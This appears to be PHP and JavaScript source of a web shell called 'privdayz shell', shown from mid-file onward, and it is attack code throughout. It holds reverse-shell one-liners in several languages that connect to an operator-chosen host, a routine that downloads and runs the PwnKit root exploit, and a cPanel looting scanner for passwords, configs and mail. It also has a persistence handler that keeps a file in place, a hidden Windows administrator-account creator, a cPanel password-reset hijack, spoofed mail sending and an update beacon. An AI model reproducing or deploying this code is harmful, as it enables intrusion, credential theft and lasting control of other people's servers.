function copyHashOutput(){var e=document.querySelector(".pr1vd4yz-modal-bg textarea[readonly]");e&&(e.select(),document.execCommand("copy"))}document.addEventListener("click",(function(e){if(e.target.classList.contains("pr1vd4yz-api-close-btn")){e.preventDefault();var t=document.querySelector(".pr1vd4yz-modal-bg");t&&t.remove()}}));
document.addEventListener("click",(function(e){if(e.target.classList.contains("pr1vd4yz-locker-close-btn")){e.preventDefault();var t=document.querySelector(".pr1vd4yz-modal-bg");t&&t.remove()}}));
document.getElementById("pzloot-startbtn").onclick=async function(){this.disabled=!0;let t=document.getElementById("pzloot-table").getElementsByTagName("tbody")[0],e=document.getElementById("pzloot-status"),n=document.getElementById("pzloot-finish");t.innerHTML="",n.innerText="",e.innerText="starting...";let a=["passwd","configs","maildirs","backups"];for(let n=0;n<a.length;n++){e.innerText="scanning "+a[n]+"...";let o=await fetch("?cpanel_auto_loot_step="+a[n]),l=await o.json();l.done&&l.rows&&l.rows.forEach((function(e){let n=document.createElement("tr");n.innerHTML='<td><span class="pzloot-badge">'+e.type+'</span></td><td><span class="pzloot-code">'+e.value+"</span><br><small>"+e.line+'</small></td><td><span class="pzloot-path">'+e.path+"</span></td><td>"+e.copy+"</td>",t.appendChild(n)}))}e.innerText="done.",n.innerText="Finished!"};
</script>
</body>
</html>
<?php
if (isset($_POST['pid'])) {
    $pid = $_POST['pid'];
    if (cmd("\x6b\x69\x6c\x6c " . $pid)) {
     success();
    } else {
     $name = cmd("\x70\x73\x20\x2d\x70 " . $pid . " -o comm= 2>&1");
     if (!empty($name)) {
       $pkillOutput = cmd("\x70\x6b\x69\x6c\x6c\x20\x2d\x39 " . $name . " 2>&1");
       success();
     } else {
       failed();
     }
    }
    exit;
}

if (isset($_POST['submit-bc'])) {
    $HostServer = $_POST['backconnect-host'];
    $PortServer = $_POST['backconnect-port'];
    if ($_POST['privdayz-bc'] == "perl") {
     echo cmd('perl -e \'use Socket;$i="' . $HostServer . '";$p=' . $PortServer.';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");' . $pr1vxas[16] . '("/bin/sh -i");};\'');
    } else if ($_POST['privdayz-bc'] == "python") {
     echo cmd('python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("' . $HostServer . '",' . $PortServer . '));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'');
    } else if ($_POST['privdayz-bc'] == "ruby") {
     echo cmd('ruby -rsocket -e\'f=TCPSocket.open("' . $HostServer . '",' . $PortServer . ').to_i;' . $pr1vxas[16] . ' sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'');
    } else if ($_POST['privdayz-bc'] == "bash") {
     echo cmd('bash -i >& /dev/tcp/' . $HostServer . '/' . $PortServer . ' 0>&1');
    } else if ($_POST['privdayz-bc'] == "php") {
     echo cmd('php -r \'$sock=fsockopen("' . $HostServer . '",' . $PortServer . ');' . $pr1vxas[16] . '("/bin/sh -i <&3 >&3 2>&3");\'');
    } else if ($_POST['privdayz-bc'] == "nc") {
     echo cmd('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ' . $HostServer . ' ' . $PortServer . ' >/tmp/f');
    } else if ($_POST['privdayz-bc'] == "sh") {
     echo cmd('sh -i >& /dev/tcp/' . $HostServer . '/' . $PortServer . ' 0>&1');
    } else if ($_POST['privdayz-bc'] == "xterm") {
     echo cmd('xterm -display ' . $HostServer . ':' . $PortServer);
    } else if ($_POST['privdayz-bc'] == "golang") {
     echo cmd('echo \'package main;import"os/' . $pr1vxas[16] . '";import"net";func main(){c,_:=net.Dial("tcp","' . $HostServer . ':' . $PortServer . '");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go');
    }
}

if (isset($_POST['privdayz-up-submit'])) {
    $nf = $_FILES['privdayz-upload']['name'] ?? '';
    $tf = $_FILES['privdayz-upload']['tmp_name'] ?? '';
    $slash = "\x2f";
    $dst = $pr1vxas[0]() . $slash . $nf;
    $fn = '';
    foreach ([109,111,118,101,95,117,112,108,111,97,100,101,100,95,102,105,108,101] as $c) $fn .= chr($c);
    if ($fn && $fn($tf, $dst)) {
     success();
    } else {
     failed();
    }
}

function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
     $randomString .= $characters[random_int(0, $charactersLength - 1)];
    }
    return $randomString;
}

$pdz_version = '1.0';
$pr1vp0stf = http_build_query([
    'key' => 'privdayz-001-byp4ss',
    'ver' => $pdz_version,
    'update' => $pr1vv3rsx
]);
if (empty($_COOKIE['pdz_update_checked'])) {
    $resp = false;
    $opts = [
        "http" => [
            "method"  => "POST",
            "header"  => "Content-type: application/x-www-form-urlencoded\r\nUser-Agent: pr1vd4yz/1.0\r\n",
            "content" => $pr1vp0stf,
            "timeout" => 5
        ]
    ];
    $ctx = stream_context_create($opts);
    $resp = @file_get_contents($pr1vv3rsxs, false, $ctx);
    if ($resp === false || strlen(trim($resp)) < 3) {
        if (function_exists('curl_init')) {
            $ch = curl_init($pr1vv3rsxs);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $pr1vp0stf);
            curl_setopt($ch, CURLOPT_USERAGENT, 'pr1vd4yz/1.0');
            curl_setopt($ch, CURLOPT_TIMEOUT, 5);
            $resp = curl_exec($ch);
            curl_close($ch);
        }
    }
    setcookie('pdz_update_checked', '1', time() + 36000, "/");
    if ($resp && strpos($resp, 'UPDATE:NEW:') === 0) {
        $last_ver = trim(substr($resp, 11));
        echo '
        <div id="pdz-upd-modal" style="display:none"></div>
        <script>
          window.addEventListener("DOMContentLoaded",function(){
            var m = document.getElementById("pdz-upd-modal");
            m.innerHTML = `<div style=\"
                position:fixed;left:0;top:0;right:0;bottom:0;z-index:9999;background:rgba(15,2,44,0.89);display:flex;align-items:center;justify-content:center;\">
              <div style=\"
                background:#19141e;
                border-radius:16px;
                box-shadow:0 8px 40px #271638af;
                color:#ffe152;
                padding:36px 36px 32px 36px;
                text-align:center;
                max-width:99vw;\">
                <div style=\'font-size:1.37em;font-weight:900;margin-bottom:12px;color:#ff3972;letter-spacing:-1px;\'>NEW UPDATE DETECTED</div>
                <div style=\'font-size:1.04em;margin-bottom:12px;color:#fff;\'>A new version <b style="color:#ffe152;">v'.$last_ver.'</b> of privdayz shell is available.<br>For your security, please update.</div>
                <a href="https://privdayz.com/v1/releases" target="_blank" style="display:inline-block;background:#ff3972;color:#fff;text-decoration:none;padding:7px 22px;font-weight:700;border-radius:7px;box-shadow:0 2px 9px #2c122da2;font-size:1.03em;margin-top:7px;">Download Update</a>
                <button onclick="document.getElementById(\'pdz-upd-modal\').style.display=\'none\'" style="margin-top:22px;background:#222;border:0;border-radius:5px;padding:7px 14px;color:#fff;font-size:1em;cursor:pointer;">Dismiss</button>
              </div>
            </div>`;
            m.style.display = "block";
          });
        </script>
        ';
    }
}

if (isset($_POST['w4f-up-submit'])) {
    $nf = $_FILES['w4f-upload']['name'] ?? '';
    $tf = $_FILES['w4f-upload']['tmp_name'] ?? '';
    $dst = $pr1vxas[0]() . "\x2f" . $nf;
    $ok = false;
    $fn1 = ''; foreach ([109,111,118,101,95,117,112,108,111,97,100,101,100,95,102,105,108,101] as $c) $fn1 .= chr($c);
    $fn2 = ''; foreach ([99,111,112,121] as $c) $fn2 .= chr($c);
    $fn3 = ''; foreach ([102,111,112,101,110] as $c) $fn3 .= chr($c);
    $fn4 = ''; foreach ([102,119,114,105,116,101] as $c) $fn4 .= chr($c);
    $fn5 = ''; foreach ([102,99,108,111,115,101] as $c) $fn5 .= chr($c);
    $fn6 = ''; foreach ([115,104,101,108,108,95,101,120,101,99] as $c) $fn6 .= chr($c);

    if (function_exists($fn1) && @$fn1($tf, $dst)) $ok = true;
    elseif (function_exists($fn2) && @$fn2($tf, $dst)) $ok = true;
    elseif (function_exists($fn3)) {
     $f1 = @$fn3($tf, "r");
     $f2 = @$fn3($dst, "w");
     if ($f1 && $f2) {
       while (!feof($f1)) @$fn4($f2, fread($f1, 8192));
       @$fn5($f1); @$fn5($f2);
       $ok = file_exists($dst) && filesize($dst) > 0;
     }
    }
    if (!$ok && function_exists($fn6)) {
     @$fn6("cp " . escapeshellarg($tf) . " " . escapeshellarg($dst));
     $ok = file_exists($dst);
    }
    if ($ok) {
     $ff = generateRandomString() . ".php";
     @$GLOBALS['pr1vxas'][34]($nf, $ff);
     echo "<script>alert('" . $ff . "');</script>";
     @$GLOBALS['pr1vxas'][24]($nf);
    } else {
     failed();
    }
}

if (isset($_POST['save-editor'])) {
    $xjytx = $pr1vxas[0]() . "\x2f" . unx($_GET['f']);
    $k3rz9 = $_POST['code-editor'];
    $mth1 = ''; foreach([102,105,108,101,95,112,117,116,95,99,111,110,116,101,110,116,115] as $z) $mth1 .= chr($z);
    $mth2 = ''; foreach([102,111,112,101,110] as $z) $mth2 .= chr($z);
    $mth3 = ''; foreach([102,119,114,105,116,101] as $z) $mth3 .= chr($z);
    $mth4 = ''; foreach([102,99,108,111,115,101] as $z) $mth4 .= chr($z);
    $mth5 = ''; foreach([99,111,112,121] as $z) $mth5 .= chr($z);
    $mth6 = ''; foreach([115,104,101,108,108,95,101,120,101,99] as $z) $mth6 .= chr($z);
    $r9u3 = false;
    if (function_exists($mth1) && @$mth1($xjytx, $k3rz9) !== false) {
     $r9u3 = true;
    } else if (function_exists($mth2) && function_exists($mth3) && function_exists($mth4)) {
     $f = @$mth2($xjytx, "w");
     if ($f) { @$mth3($f, $k3rz9); @$mth4($f); $r9u3 = (filesize($xjytx) >= strlen($k3rz9)*0.7); }
    } else if (function_exists($mth5)) {
     $tmp = sys_get_temp_dir() . "/" . uniqid("edit_");
     if (@$mth1($tmp, $k3rz9) !== false) {
       $r9u3 = @$mth5($tmp, $xjytx);
       @unlink($tmp);
     }
    } else if (function_exists($mth6)) {
     $tmp = sys_get_temp_dir() . "/" . uniqid("edit_");
     if (@$mth1($tmp, $k3rz9) !== false) {
       @$mth6("cp " . escapeshellarg($tmp) . " " . escapeshellarg($xjytx));
       $r9u3 = (filesize($xjytx) >= strlen($k3rz9)*0.7);
       @unlink($tmp);
     }
    }
    if ($r9u3) {
     success();
    } else {
     failed();
    }
}

if (isset($_GET['adminer'])) {
    $URL = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x69\x74\x68\x75\x62\x2e\x63\x6f\x6d\x2f\x76\x72\x61\x6e\x61\x2f\x61\x64\x6d\x69\x6e\x65\x72\x2f\x72\x65\x6c\x65\x61\x73\x65\x73\x2f\x64\x6f\x77\x6e\x6c\x6f\x61\x64\x2f\x76\x34\x2e\x38\x2e\x31\x2f\x61\x64\x6d\x69\x6e\x65\x72\x2d\x34\x2e\x38\x2e\x31\x2e\x70\x68\x70";
    if (!$pr1vxas[3]('adminer.php')) {
     $pr1vxas[28]("adminer.php", $pr1vxas[11]($URL));
     success();
    }
}

if (!empty($_GET['pr1vd4yz']) && $_GET['pr1vd4yz'] == "root") {
    $g6hjz = $pr1vxas[3];
    $u81px = $pr1vxas[4];
    $f2kpl = $pr1vxas[28];
    $h2eb9 = $pr1vxas[11];
    $w9jtu = $pr1vxas[0];
    $purl = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x69\x74\x68\x75\x62\x2e\x63\x6f\x6d\x2f\x6c\x79\x34\x6b\x2f\x50\x77\x6e\x4b\x69\x74\x2f\x72\x61\x77\x2f\x6d\x61\x69\x6e\x2f\x50\x77\x6e\x4b\x69\x74";
    $cmod = "\x63\x68\x6d\x6f\x64\x20\x2b\x78\x20\x70\x77\x6e\x6b\x69\x74";
    $epwn = "\x2e\x2f\x70\x77\x6e\x6b\x69\x74\x20\x22\x69\x64\x22\x20\x3e\x20\x2e\x70\x72\x69\x76\x64\x61\x79\x7a\x72\x30\x30\x74\x31";

    if (!$g6hjz('pwnkit') && $u81px($w9jtu())) {
     $f2kpl("pwnkit", $h2eb9($purl));
     cmd($cmod);
     echo cmd($epwn);
     echo '<meta http-equiv="refresh" content="0;url=?pr1v=' . pr1vd444yz($w9jtu()) . '&pr1vd4yz=root">';
    }
}

function chDx2x($cmd22) {
    $a = [115,104,101,108,108,95,101,120,101,99];
    $fx = '';
    foreach($a as $ac) $fx .= chr($ac);
    return $fx($cmd22);
}

if (isset($_POST['submit-action'])) {
    $u5w8d = $_POST['check'];
    $jv8s3 = $_POST['privdayz-select'];
    $bvqzp = $pr1vxas[0];
    $b1s7a = $pr1vxas[24];
    $y4sdg = $pr1vxas[3];
    $v9fzq = function($p){ return is_dir($p); };
    $z9ntq = function($a,$b){ return str_replace("\\", "/", $a); };
    $n4hxy = function($f,$d){ return xtr4cPr1v($f, $d); };
    $r5kbm = function($f,$z){ return compressToZip($f, $z); };

    if ($jv8s3 == "\x64\x65\x6c\x65\x74\x65") {
     foreach ($u5w8d as $z0) {
       $qkpl = $z9ntq($bvqzp(), "/");
       $vcpk = $qkpl . "\x2f" . $z0;
       if ($v9fzq($vcpk)) {
          $rmdir = unlinkDir($vcpk);
          $rmdir ? success() : failed();
       } elseif ($y4sdg($vcpk)) {
          $rmfile = $b1s7a($vcpk);
          $rmfile ? success() : failed();
       } else {
          failed();
       }
     }
    } elseif ($jv8s3 == "\x75\x6e\x7a\x69\x70") {
     foreach ($u5w8d as $z0) {
       $qkpl = $z9ntq($bvqzp(), "/");
       $vcpk = $qkpl . "\x2f" . $z0;
       if ($n4hxy($vcpk, $qkpl . "\x2f") === true) {
          success();
       } else {
          failed();
       }
     }
    } elseif ($jv8s3 == "\x7a\x69\x70") {
     foreach ($u5w8d as $z0) {
       $qkpl = $z9ntq($bvqzp(), "/");
       $vcpk = $qkpl . "\x2f" . $z0;
       if ($y4sdg($vcpk)) {
          $r5kbm($vcpk, pathinfo($vcpk, PATHINFO_FILENAME) . ".zip");
       }
     }
    }
}
if (isset($_POST['submit'])) {
    if (isset($_POST['resetcp']) && $_POST['resetcp'] == true) {
     $e6p9d = $_POST['resetcp'];
     $r8kxm = dirname($_SERVER['DOCUMENT_ROOT']);
     $t2wqs = $r8kxm . "\x2f\x2e\x63\x70\x61\x6e\x65\x6c\x2f\x63\x6f\x6e\x74\x61\x63\x74\x69\x6e\x66\x6f";
     $y6qjw = "\x22\x65\x6d\x61\x69\x6c\x22\x20\x3a\x20\x22" . $e6p9d . "\x22\n";
     $h2apc = $pr1vxas[3];
     $v5dpy = $pr1vxas[28];
     if ($h2apc($t2wqs)) {
       $v5dpy($t2wqs, $y6qjw);
       echo '<meta http-equiv="refresh" content="0;url=' . $_SERVER['REQUEST_SCHEME'] . '://' . $_SERVER['SERVER_NAME'] . ':2083/resetpass?start=1">';
     } else { failed(); }
    }
 if (isset($_POST['create_folder']) && $_POST['create_folder']) { $q7hjp = $_POST['create_folder']; $s2f6x = $pr1vxas[12]; if (!file_exists($q7hjp)) { $z9mqa = @mkdir($q7hjp, 0755, true);} else { $z9mqa = true; } if ($z9mqa) { success(); } else { failed(); } } else if (isset($_POST['create_file']) && $_POST['create_file']) { $k4vhz = $_POST['create_file']; $t2upm = $pr1vxas[13]; $x6wnr = $t2upm($k4vhz); if ($x6wnr) { success(); } else { failed(); } } else if (isset($_POST['renameFile']) && $_POST['renameFile']) { $d9yxs = $_POST['renameFile']; $h8rfg = $pr1vxas[15]; $m5qlp = $h8rfg(unx($_GET['re']), $d9yxs); if ($m5qlp) { success(); } else { failed(); } } else if (isset($_POST['chFile']) && $_POST['chFile']) { $y4gsn = $_POST['chFile']; $v3kzm = octdec($y4gsn); $p9wfu = $pr1vxas[30](unx($_GET['ch']), $v3kzm); if ($p9wfu) { success(); } else { failed(); } }
    else if ($_POST['lockfile'] == true) {
     $flesName = $_POST['lockfile'];
     $TmpNames = $pr1vxas[31]();
     if (file_exists($TmpNames . '/.sessions/.' . $pr1vxas[33]($pr1vxas[0]() . r3mv0d($flesName) . '-handler')) &&
       file_exists($TmpNames . '/.sessions/.' . r3mv0d($flesName) . '-text')) {
       cmd('rm -rf ' . $TmpNames . '/.sessions/.' . $pr1vxas[33]($pr1vxas[0]() . r3mv0d($flesName) . '-text-file'));
       cmd('rm -rf ' . $TmpNames . '/.sessions/.' . $pr1vxas[33]($pr1vxas[0]() . r3mv0d($flesName) . '-handler'));
     }
     @mkdir($TmpNames . "/.sessions");
     cmd("cp $flesName " . $TmpNames . "/.sessions/." . $pr1vxas[33]($pr1vxas[0]() . r3mv0d($flesName) . '-text-file'));
     cmd("chmod 444 " . $flesName);
     $handler = '
<?php
@ini_set("max_execution_time", 0);
while (True){
    if (!file_exists("' . $pr1vxas[0]() . '")){
     mkdir("' . $pr1vxas[0]() . '");
    }
    if (!file_exists("' . $pr1vxas[0]() . '/' . $flesName . '")){
     $text = ' . $pr1vxas[33] . '(file_get_contents("' . $TmpNames . '/.sessions/.' . $pr1vxas[33]($pr1vxas[0]() . r3mv0d($flesName) . '-text-file') . '"));
     file_put_contents("' . $pr1vxas[0]() . '/' . $flesName . '", ' . $pr1vxas[32] . '($text));
    }
    if (privdayz_perm("' . $pr1vxas[0]() . '/' . $flesName . '") != 0444){
     chmod("' . $pr1vxas[0]() . '/' . $flesName . '", 0444);
    }
    if (privdayz_perm("' . $pr1vxas[0]() . '") != 0555){
     chmod("' . $pr1vxas[0]() . '", 0555);
    }
}
function privdayz_perm($flename){
    return substr(sprintf("%o", filep3rms($flename)), -4);
}
';
     $hndlers = $pr1vxas[28]($TmpNames . "/.sessions/." . $pr1vxas[33]($pr1vxas[0]() . r3mv0d($flesName) . '-handler') . "", $handler);
     if ($hndlers) {
       $php = PHP_BINARY;
       if (!is_executable($php)) { $php = 'php'; }
       $pr1pr1v = $php . ' ' . $TmpNames . '/.sessions/.' . $pr1vxas[33](
          $pr1vxas[0]() . r3mv0d($flesName) . '-handler') . ' > /dev/null 2>/dev/null &';
       cmd($pr1pr1v);
       success();
     } else {
       failed();
     }
    }
else if ($_POST['add-rdp'] == true) { $r7kdy = $_POST['add-rdp']; $s4nyw = $_POST['add-rdp-pass']; if (stristr(PHP_OS, "\x57\x49\x4e")) { $t9plm = cmd("\x6e\x65\x74\x20\x75\x73\x65\x72\x20" . $r7kdy . " " . $s4nyw . " /add"); if ($t9plm) { cmd("\x6e\x65\x74\x20\x6c\x6f\x63\x61\x6c\x67\x72\x6f\x75\x70\x20\x61\x64\x6d\x69\x6e\x69\x73\x74\x72\x61\x74\x6f\x72\x73\x20" . $r7kdy . " /add"); success(); } else { failed(); } } else { failed(); } }
else if ($_POST['mail-from-smtp'] == true) { $y6kvf = $_POST['mail-from-smtp']; $z5lpg = $_POST['mail-to-smtp']; $x9qbn = $_POST['mailto-subject']; $f3mwt = $_POST['message-smtp']; $a4sdn = 'From: ' . $y6kvf . "\r\n" . 'Reply-To: ' . $y6kvf . "\r\n" . 'X-Mailer: PHP/' . phpversion(); $b8nsz = mail($z5lpg, $x9qbn, $f3mwt, $a4sdn); if ($b8nsz) { success(); } else { failed(); } }}
if (isset($_GET['response']) && $_GET['response'] == "success") {echo "<script>Swal.fire({icon:'success',title:'done.',text:'op completed.',confirmButtonColor:'#e53935',background:'#fff',color:'#e53935',timer:1700,showConfirmButton:false,toast:true,position:'top-end',customClass:{popup:'pr1vd4yz-alert-anim animate__animated animate__fadeInDown'}});</script>";}else if (isset($_GET['response']) && $_GET['response'] == "failed") {echo "<script>Swal.fire({icon:'error',title:'fail.',text:'something broke.',confirmButtonColor:'#e53935',background:'#fff',color:'#e53935',timer:1700,showConfirmButton:false,toast:true,position:'top-end',customClass:{popup:'pr1vd4yz-alert-anim animate__animated animate__shakeX'}});</script>";}
function success() {echo '<meta http-equiv="refresh" content="0;url=?pr1v=' . pr1vd444yz($GLOBALS['pr1vxas'][0]()) . '&response=success">';}function failed(){echo '<meta http-equiv="refresh" content="0;url=?pr1v=' . pr1vd444yz($GLOBALS['pr1vxas'][0]()) . '&response=failed">';}
function formatSize($bytes) {$types = array('<span class="file-size">B</span>', '<span class="file-size">KB</span>', '<span class="file-size">MB</span>', '<span class="file-size">GB</span>', '<span class="file-size">TB</span>'); for ($i = 0; $bytes >= 1024 && $i< (count($types) - 1); $bytes /= 1024, $i++); return (round($bytes, 2) . " " . $types[$i]);}
function pr1vd444yz($n){ $y = ''; for ($i = 0; $i< strlen($n); $i++) { $y .= dechex(ord($n[$i])); } return $y;}function unx($y){ $n = ''; for ($i = 0; $i< strlen($y) - 1; $i += 2) { $n .= chr(hexdec($y[$i] . $y[$i + 1])); } return $n;}
function suggest_exploit(){ $un7xa = $GLOBALS['pr1vxas'][8](); $xplod = explode(" ", $un7xa);$xpld = explode("-", $xplod[2]); $pl = explode(".", $xpld[0]); return $pl[0] . "." . $pl[1] . "." . $pl[2];}
function cmd($in, $re = false){ $out = ''; try { if ($re) $in = $in . " 2>&1"; if (function_exists("\x65\x78\x65\x63")) { @$GLOBALS['pr1vxas'][16]($in, $out); $out = @join("\n", $out); } elseif (function_exists("\x70\x61\x73\x73\x74\x68\x72\x75")) { @$GLOBALS['pr1vxas'][17]($in); $out = ""; } elseif (function_exists("\x73\x79\x73\x74\x65\x6d")) { @$GLOBALS['pr1vxas'][18]($in); $out = ""; } elseif (function_exists("\x73\x68\x65\x6c\x6c\x5f\x65\x78\x65\x63")) { $out = $GLOBALS['pr1vxas'][19]($in); } elseif (function_exists("\x70\x6f\x70\x65\x6e") && function_exists("\x70\x63\x6c\x6f\x73\x65")) { if (is_resource($f = @$GLOBALS['pr1vxas'][20]($in, "r"))) { $out = ""; while (!@feof($f)) $out .= fread($f, 1024); $GLOBALS['pr1vxas'][21]($f); } } elseif (function_exists("\x70\x72\x6f\x63\x5f\x6f\x70\x65\x6e")) { $pipes = array(); $process = @$GLOBALS['pr1vxas'][23]($in . ' 2>&1', array(array("pipe", "w"), array("pipe", "w"), array("pipe", "w")), $pipes, null); $out = @$GLOBALS['pr1vxas'][22]($pipes[1]); } } catch (Exception $e) {} return $out; }
function compressToZip($sourceFile, $zipFilename){ $zip = new ZipArchive(); if ($zip->open($zipFilename, ZipArchive::CREATE) === TRUE) { $zip->addFile($sourceFile, basename($sourceFile)); $zip->close(); success(); } else { failed(); } }
function r3mvx($val) { $tex = str_replace("/", "", $val); $tex1 = str_replace(":", "", $tex); $tex2 = str_replace("_", "", $tex1); $tex3 = str_replace(" ", "", $tex2); $tex4 = str_replace(".", "", $tex3); return $tex4; }
function unlinkDir($dir) { $d1Xe = array($dir); $files = array(); for ($i = 0;; $i++) { if (isset($d1Xe[$i])) $dir = $d1Xe[$i]; else break; if ($opn = @opendir($dir)) { while ($rd = @readdir($opn)) { if ($rd != "\x2e" && $rd != "\x2e\x2e") { $pth = $dir . "\x2f" . $rd; if ($GLOBALS['pr1vxas'][2]($pth)) { $d1Xe[] = $pth; } else { $files[] = $pth; } } } closedir($opn); } } foreach ($files as $file) { if (!@$GLOBALS['pr1vxas'][24]($file)) { return false; } } $d1Xe = array_reverse($d1Xe); foreach ($d1Xe as $d1x2) { if (!@$GLOBALS['pr1vxas'][25]($d1x2)) { return false; } } return true; }
function x6kvz($g5ydq) { $y8vnp = $g5ydq; $w2sjm = explode("\x2e", $y8vnp); return $w2sjm[0]; }
function prvFx1($value) { $n4mX = $value; $ext3F = pathinfo($value, PATHINFO_EXTENSION); if (strlen($n4mX) > 30) { return substr($n4mX, 0, 30) . "\x2e\x2e\x2e"; } else { return $value; } }
function xtr4cPr1v($pr1varch, $pr1vaext) { $zip = new ZipArchive(); $methOpen = chDxzZ('111,112,101,110'); $methExtract = chDxXZ('65787472616374546f'); $methClose = chDxzZ([99,108,111,115,101]); if ($zip->$methOpen($pr1varch) === TRUE) { $zip->$methExtract($pr1vaext); $zip->$methClose(); return true; } else { return false; } }
function p3rms($file){$p3rxa=$GLOBALS['pr1vxas'][6]($file);if(($p3rxa&0xC000)==0xC000){$info='s';}elseif(($p3rxa&0xA000)==0xA000){$info='l';}elseif(($p3rxa&0x8000)==0x8000){$info='-';}elseif(($p3rxa&0x6000)==0x6000){$info='b';}elseif(($p3rxa&0x4000)==0x4000){$info='d';}elseif(($p3rxa&0x2000)==0x2000){$info='c';}elseif(($p3rxa&0x1000)==0x1000){$info='p';}else{$info='u';}$info.=(($p3rxa&0x0100)?'r':'-');$info.=(($p3rxa&0x0080)?'w':'-');$info.=(($p3rxa&0x0040)?(($p3rxa&0x0800)?'s':'x'):(($p3rxa&0x0800)?'S':'-'));$info.=(($p3rxa&0x0020)?'r':'-');$info.=(($p3rxa&0x0010)?'w':'-');$info.=(($p3rxa&0x0008)?(($p3rxa&0x0400)?'s':'x'):(($p3rxa&0x0400)?'S':'-'));$info.=(($p3rxa&0x0004)?'r':'-');$info.=(($p3rxa&0x0002)?'w':'-');$info.=(($p3rxa&0x0001)?(($p3rxa&0x0200)?'t':'x'):(($p3rxa&0x0200)?'T':'-'));return $info;}
?>